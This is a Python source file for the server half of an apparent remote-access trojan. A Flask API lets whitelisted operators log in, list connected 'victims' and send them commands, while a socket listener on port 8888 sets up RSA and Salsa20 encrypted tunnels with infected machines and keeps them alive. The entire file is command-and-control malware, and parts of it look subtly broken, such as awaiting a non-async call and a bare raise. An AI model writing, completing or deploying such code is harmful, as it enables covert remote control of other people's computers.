import asyncio
import rsa
import zlib
import uuid
import hashlib
import tomllib
import threading
import time
import socket
import select
import argparse
import logging

from flask import Flask, request, jsonify
from dataclasses import dataclass

from lib import api
from lib.api import HTTP_SESSION
from lib.crypto import EncryptedTunnel, get_hwid

"""
TODO: create lib/logging.py & apply logging in main.py 
"""

# ----> [ CLI parsing ] <----

parser = argparse.ArgumentParser()
parser.add_argument("--ssl", action="store_true", help="Enable HTTPS")
parser.add_argument("-v", "--verbose", action="store_true")

# --- [ Init variables ] ---

current_dir = "/".join(__file__.split("/")[:-1])
config = tomllib.load(open(current_dir + "/config/config.toml", "rb"))

app_api = Flask(__name__)
http_session = HTTP_SESSION()
whitelist_users = config.get("whitelist")

if whitelist_users is None:
    raise

@dataclass
class ServerConfig:
    FINGERPRINT = hashlib.sha256((hex(uuid.getnode()) + get_hwid()).encode()).hexdigest()
    BUFSIZE: int
    VICTIMS: dict # {addr: [fingerprint, pc_name, EncryptedTunnel]}

servercfg = ServerConfig(1024, {})

# TODO: client management

def server_api(host: str, port: int, debug: bool, ssl_context: tuple):
   
    # >>> [ACCESS] <<<
    
    @app_api.route("/access", methods=["POST"])
    async def access():
        json_req: dict = request.get_json()
        username: str = json_req["username"]
        password: str = json_req["password"]

        if username in whitelist_users:

            # Check password with the whitelist
            if password == hashlib.sha256(whitelist_users[username].encode()).hexdigest():
                # Generate & add session
                session = http_session.add_session(request.remote_addr)
                return jsonify({"session": session[1]})
            else:
                return jsonify({"error": "Username of password invalid"}), 401
    
        else:
            return jsonify({"error": "Username or password invalid"}), 401

        return jsonify({"session": session[1]})

     # >>> [GET_AGENTS] <<<
    
    @app_api.route("/get_agents/<session>")
    async def send_agents(session):

        # Check IF exist session
        if http_session.check(request.remote_addr, session):
            
            # Add agents fingerprint into `agents_fingerprint`
            agents_fingerprint = []
            for v in servercfg.VICTIMS:
                agents_fingerprint.append(servercfg.VICTIMS[v][0].decode())

            return jsonify({"fingerprints": agents_fingerprint})
        
        else:
            return jsonify({"error": "Invalid session"})

    # >>> [ SEND_COMMAND ] <<<

    @app_api.route("/send_command", methods=["POST"])
    async def agent_command():
        json_req: dict = request.get_json()
        fingerprint = json_req["fingerprint"] # Agent fingerprint
        command = json_req["command"]

        # Get addr:port by agent fingerprint
        key_agent = api.get_tunnel_by_fingerprint(servercfg.VICTIMS, fingerprint)
        
        if key_agent is None:
            return jsonify({"error": "This agent don't exist"}), 403
        
        else:
            s: EncryptedTunnel = servercfg.VICTIMS[key_agent][2]
            try:
                # TODO: do better  -> set recv dynamic bufsize
                s.send(command)
             
                return jsonify({"output": await s.recv(servercfg.BUFSIZE).decode()})
            
            except Exception as e:
                return jsonify({"error": str(e)}), 408
            
    # --- [ Start HTTP(s) server ] ---

    if len(ssl_context) > 0:
        app_api.run(host, port, debug, ssl_context = ssl_context)
    else:
        app_api.run(host, port, debug)

async def handle_victims(r: asyncio.streams.StreamReader, w: asyncio.streams.StreamWriter):
    # Get addr socket
    peername = w.get_extra_info('peername')
    formated_peername = peername[0] + ':' + str(peername[1])
    
    # Get socket
    client_socket: socket.socket = w.get_extra_info('socket')
    
    # Get a fingerprint (random string)
    fingerprint = await r.read(servercfg.BUFSIZE)

    # Generate rsa keys
    # will be used for key exchange + nonce to start communicating only with Salsa20
    # (which allows its larger data exchange)
    public_key, private_key = rsa.newkeys(1024)    

    w.write(rsa.PublicKey.save_pkcs1(public_key))
    await w.drain()

    # Gets the RSA-encrypted string containing the key and nonce
    # Decompress the packet with zlib
    # Splits the string using '<SPR>' as the separator
    key, nonce = zlib.decompress(rsa.decrypt(await r.read(servercfg.BUFSIZE), private_key)).split(b"<SPR>")

    # Initializes the 'EncryptedTunnel' class that allows communication with the client using Salsa20,
    # using the key and nonce obtained previously
    enctunnel = EncryptedTunnel(r, w, key, nonce)

    # Adding to 'VICTIMS' the current victim: {addr: [fingerprint, pc_name, EncryptedTunnel]}
    servercfg.VICTIMS[formated_peername] = [fingerprint, "pcname", enctunnel]

    client_socket.setblocking(0)
    ready = select.select([client_socket], [], [], 5)

    while True:
        time.sleep(5)
        try:
            await enctunnel.send(b'2')    
            if ready[0]:
                await enctunnel.recv(2)
        except:
            servercfg.VICTIMS.pop(formated_peername)
            break

async def main():
    args = parser.parse_args()

    # Disable Flask printing
    logging.getLogger("werkzeug").disabled = True

    # Open multiple server
    server_victims = await asyncio.start_server(handle_victims, '0.0.0.0', 8888)
    if not args.ssl:
        https_files = ()
    else:
        https_files = (current_dir + "/config/website.crt", current_dir + "/config/private.key")

    threading.Thread(target=server_api, args=('127.0.0.1', config.get("api").get("port"), False, https_files)).start()

    # Looping server
    async with server_victims:
        await server_victims.serve_forever()

if __name__ == "__main__":
    asyncio.run(main())
